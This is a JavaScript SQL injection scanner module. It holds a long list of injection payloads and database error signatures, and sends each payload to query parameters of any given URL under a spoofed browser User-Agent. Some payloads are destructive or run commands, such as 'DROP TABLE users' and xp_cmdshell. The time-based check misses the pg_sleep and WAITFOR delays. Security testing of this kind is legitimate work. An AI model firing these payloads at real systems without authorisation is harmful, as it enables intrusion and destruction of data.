const axios = require('axios');

// ═══════════════════════════════════════════════════
// SQL Injection Scanner — 80+ payloads, 50+ patterns
// ═══════════════════════════════════════════════════

const PAYLOADS = [
  // ── Classic boolean ──
  "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*",
  '" OR "1"="1', '" OR "1"="1" --', '" OR "1"="1" #',
  "' OR 1=1 --", "' OR 1=1#", "' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--",
  "admin'--", "admin'#", "') OR ('1'='1", "') OR ('1'='1'--",

  // ── UNION-based ──
  "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT 1--", "' UNION SELECT 1,2--", "' UNION SELECT 1,2,3--",
  "' UNION SELECT 1,2,3,4--", "' UNION SELECT 1,2,3,4,5--",
  "' UNION ALL SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
  "' UNION SELECT username,password FROM users--",
  "' UNION SELECT table_name,NULL FROM information_schema.tables--",
  "' UNION SELECT column_name,NULL FROM information_schema.columns--",

  // ── Error-based ──
  "' AND 1=CONVERT(int,(SELECT @@version))--",
  "' AND 1=CAST((SELECT @@version) AS int)--",
  "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
  "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
  "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
  "' AND 1=1 AND '1'='1", "' AND 1=2 AND '1'='1",
  "' AND 1=(SELECT TOP 1 name FROM sysobjects)--",

  // ── Time-based blind ──
  "' AND SLEEP(3)--", "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:3'--",
  "'; WAITFOR DELAY '0:0:5'--", "' AND pg_sleep(3)--", "' AND pg_sleep(5)--",
  "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
  "' OR SLEEP(3)#", "' OR BENCHMARK(5000000,SHA1('test'))--",

  // ── Stacked queries ──
  "'; DROP TABLE users--", "'; SELECT 1;--", "'; INSERT INTO log VALUES('test')--",
  "1; EXEC xp_cmdshell('dir')--", "1; EXEC sp_configure 'show advanced options',1--",

  // ── NoSQL injection ──
  "{'$gt': ''}", "{'$ne': ''}", "{'$regex': '.*'}", "{'$where': '1==1'}",
  '{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}',
  "true, $where: '1 == 1'", "'; return true; var a='",

  // ── Encoding evasion ──
  "%27%20OR%201%3D1--", "%22%20OR%201%3D1--", "%27%20UNION%20SELECT%20NULL--",
  "'+OR+1=1--", "'+UNION+SELECT+NULL--",
  "' /*!UNION*/ /*!SELECT*/ NULL--", "' %55NION %53ELECT NULL--",

  // ── Comment injection ──
  "' AND 1=1--", "' AND/**/1=1--", "' AND/**/ '1'='1'--",
  "' /*!AND*/ 1=1--", "' %00AND 1=1--",

  // ── Second-order ──
  "admin'--", "test'; DROP TABLE sessions;--",

  // ── Auth bypass ──
  "admin' OR '1'='1", "admin')--", "' OR ''='", "' OR 1 --",
  "' OR 'x'='x", "') OR ('x'='x",
];

const ERROR_PATTERNS = [
  'sql syntax', 'mysql_', 'mysqli_', 'pg_query', 'pg_exec', 'sqlite3',
  'ORA-', 'oracle error', 'SQL Server', 'ODBC', 'DB2 SQL',
  'you have an error in your sql', 'unclosed quotation mark',
  'quoted string not properly terminated', 'syntax error at or near',
  'unexpected end of sql', 'supplied argument is not a valid mysql',
  'microsoft ole db provider', 'jet database engine',
  'invalid query', 'sql command not properly ended',
  'unterminated string', 'Incorrect syntax near',
  'Warning: mysql', 'Warning: pg_', 'Warning: sqlite',
  'PostgreSQL query failed', 'PSQLException', 'org.postgresql',
  'com.mysql.jdbc', 'java.sql.SQLException', 'SQLSTATE',
  'System.Data.SqlClient', 'System.Data.OleDb',
  'Microsoft Access Driver', 'SQLite3::query',
  'PDOException', 'Doctrine\\DBAL', 'ActiveRecord::StatementInvalid',
  'Sequel::DatabaseError', 'MongoError', 'BSONTypeError',
  'OperationalError', 'ProgrammingError', 'IntegrityError',
  'django.db.utils', 'sqlalchemy.exc',
  'column.*not found', 'table.*doesn.t exist', 'Unknown column',
  'no such table', 'relation.*does not exist',
  'Operand type clash', 'conversion failed',
  'division by zero', 'invalid input syntax',
  'XPATH syntax error', 'extractvalue', 'updatexml',
];

const PARAMS = ['id', 'page', 'user', 'name', 'search', 'q', 'item', 'product', 'category', 'cat',
  'article', 'post', 'comment', 'order', 'sort', 'type', 'action', 'view', 'file', 'path',
  'login', 'email', 'token', 'key', 'code', 'ref', 'lang', 'year', 'month', 'day', 'num'];

async function scan(targetUrl) {
  const results = { tests: [], findings: [] };
  try {
    for (const payload of PAYLOADS) {
      const testParams = PARAMS.slice(0, 6);
      let found = false;
      let tested = false;
      for (const param of testParams) {
        try {
          const start = Date.now();
          const r = await axios.get(`${targetUrl}?${param}=${encodeURIComponent(payload)}`, {
            timeout: 12000, validateStatus: () => true, maxRedirects: 3,
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' }
          });
          const elapsed = Date.now() - start;
          const body = typeof r.data === 'string' ? r.data.toLowerCase() : '';
          tested = true;

          // Check for error-based
          for (const pat of ERROR_PATTERNS) {
            if (body.includes(pat.toLowerCase())) {
              results.tests.push({ id: `sqli-err-${param}`, name: `SQLi error pattern detected in ?${param}`, status: 'fail', severity: 'critical' });
              results.findings.push({ param, payload: payload.substring(0, 50), pattern: pat, type: 'error-based' });
              found = true;
              break;
            }
          }

          // Check for time-based
          if (!found && payload.includes('SLEEP') && elapsed > 2500) {
            results.tests.push({ id: `sqli-time-${param}`, name: `SQLi time-based delay detected (${elapsed}ms) in ?${param}`, status: 'fail', severity: 'critical' });
            results.findings.push({ param, payload: payload.substring(0, 50), elapsed, type: 'time-based' });
            found = true;
          }

          if (found) break;
        } catch { /* request failed — not counted as pass */ }
      }
      if (!found && tested) {
        results.tests.push({
          id: `sqli-payload-${results.tests.length}`,
          name: `SQLi payload: ${payload.substring(0, 55)}`,
          status: 'pass', severity: 'info'
        });
      }
    }
  } catch (err) { results.error = err.message; }
  return { scanner: 'SQL Injection', icon: '🗄️', results, testCount: results.tests.length };
}

module.exports = { scan };
